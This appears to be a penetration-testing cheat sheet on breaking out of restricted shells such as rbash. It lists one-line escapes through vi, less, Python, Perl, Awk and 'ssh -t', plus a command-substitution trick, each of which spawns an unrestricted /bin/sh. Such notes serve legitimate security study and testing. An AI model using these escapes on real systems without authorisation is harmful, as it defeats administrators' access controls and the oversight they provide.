# Environment Breakout (Escaping Restricted Shells)
**Concept:** Administrators use restricted shells (`rbash`, `rksh`, `rzsh`) to limit user capabilities (e.g., blocking `/`, `cd`, or environment modification). Breaking out restores a full shell environment, enabling further enumeration and exploitation.
## 1. Enumeration
**Goal:** Identify restrictions and available tools.
- **Check Shell:** `echo $SHELL`, `env`.
- **List Allowed Commands:** `echo *` (lists binaries in the restricted PATH).
- **Test Operators:** Try redirects (`>`), pipes (`|`), and slashes (`/`).
## 2. Common Escape Techniques
If any of these binaries are allowed, they can be abused to spawn a full shell.
### Editor Escapes (Vi/Vim)
Editors often allow shell command execution.
```shell
# Syntax: Open vi, then execute shell command
vi
:!/bin/sh
# Or simply:
vi -c ':!/bin/sh' /dev/null
```
### Pager Escapes (Less/More)
If the output is long enough to trigger the pager:
```ini
# Inside 'less' or 'man'
!'/bin/sh'
```
### Language Interpreters
If Python, Perl, Ruby, or PHP are available.
```shell
# Python
python -c 'import os; os.system("/bin/sh")'

# Perl
perl -e 'exec "/bin/sh";'

# Awk
awk 'BEGIN {system("/bin/sh")}'
```
### SSH Injection
If you have SSH access to the host, force a pseudo-terminal allocation at login to bypass the default shell configuration.
```shell
# Syntax: ssh <User>@<Target> -t "<Command>"
ssh user@10.10.10.10 -t "/bin/sh"
```
### Command Injection via CLI Arguments
If allowed to run a command like `ls` or `tar`, try injecting shell operators.
```shell
# Description: Using backticks or command substitution
ls -l `pwd`
```